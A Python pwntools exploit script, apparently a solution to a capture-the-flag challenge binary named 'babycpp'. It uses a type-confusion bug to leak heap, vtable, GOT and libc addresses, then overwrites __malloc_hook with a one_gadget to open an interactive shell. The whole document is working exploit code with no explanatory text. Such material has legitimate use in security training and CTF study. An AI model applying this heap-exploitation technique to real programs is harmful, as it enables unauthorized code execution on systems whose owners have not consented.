from pwn import *

context(os='linux', arch='amd64', log_level='debug')

p = process("./babycpp")

libc = ELF('./libc-2.27.so')

one_off=0x4f322
setvbuf_off=libc.symbols['setvbuf']
malloc_hook_off=libc.symbols['__malloc_hook']

def g(p):
    gdb.attach(p)
    raw_input()

def new_str():
    p.recvuntil("choice:")
    p.sendline(str(0))
    p.recvuntil("choice:")
    p.sendline(str(2))

def set_int(hash, idx, val):
    p.recvuntil("choice:")
    p.sendline(str(2))
    p.recvuntil("hash:")
    p.send(p64(hash))
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil("val:")
    p.sendline(hex(val))

def show(hash, idx):
    p.recvuntil("choice:")
    p.sendline(str(1))
    p.recvuntil("hash:")
    p.send(p64(hash))
    p.recvuntil("idx:")
    p.sendline(str(idx))


def set_str(hash, idx, size, content, is_new=True):
    p.recvuntil("choice:")
    p.sendline(str(2))
    p.recvuntil("hash:")
    p.send(p64(hash))
    p.recvuntil("idx:")
    p.sendline(str(idx))
    if is_new:
        p.recvuntil("obj:")
        p.sendline(str(size))
        p.recvuntil("content:")
        p.send(content)    
    else:
        p.recvuntil("content:")
        p.send(content)


def update_hash(old, idx, content):
    p.recvuntil("choice:")
    p.sendline(str(3))
    p.recvuntil("hash:")
    p.send(p64(old))
    p.recvuntil("idx:")
    p.sendline(str(idx))
    p.recvuntil("hash:")
    p.send(content)


## leak heap address 
new_str()
set_str(0, 0, 0x10, '1'*0x10)
update_hash(0, 0x80000000, '\xe0\x5c')   #change to int 
show(0, 0)

p.recvuntil('The value in the array is ')
heap_addr = int('0x' + p.recv(12), 16)
print "heap_addr= "+hex(heap_addr)

## leak vtable address  ->  leak got address
heap_bin=heap_addr-0xc0
set_int(0, 0, heap_bin)
update_hash(0, 0x80000000, '\x00\x5d')  #change to str

show(0, 0)
p.recvuntil('Content:')
vtable_addr = u64(p.recv(6).ljust(0x8,"\x00"))
print "vtable_addr= " +hex(vtable_addr)
got_addr=vtable_addr+0x2011E0
print "got_addr= " + hex(got_addr)

## leak libc address
update_hash(0, 0x80000000, '\xe0\x5c') #change to int
heap_bin=heap_addr-0xc0+8
set_int(0, 0, heap_bin)
update_hash(0, 0x80000000, '\x00\x5d') #change to str
update_hash(0, 0, p64(got_addr))

show(got_addr,0)
p.recvuntil('Content:')
libc_addr = u64(p.recv(6).ljust(0x8,"\x00"))-setvbuf_off
print "libc= " +hex(libc_addr)

malloc_hook=libc_addr+malloc_hook_off
one=libc_addr+one_off

## set content -> fake obj heap  //  write one_gadget in __malloc_hook
update_hash(got_addr,0,p64(0))

update_hash(0, 0x80000000, '\xe0\x5c') #change to int
set_int(0, 0, malloc_hook)
set_int(0, 1, 0x8)
set_int(0, 2, heap_addr-0x90)

update_hash(0, 0x80000000, '\x00\x5d')  #change to str
set_str(0, 2, 0, p64(one), is_new=False)

## getshell 
p.recvuntil("choice:")
p.sendline(str(0))
p.recvuntil("choice:")
p.sendline(str(2))

p.interactive()
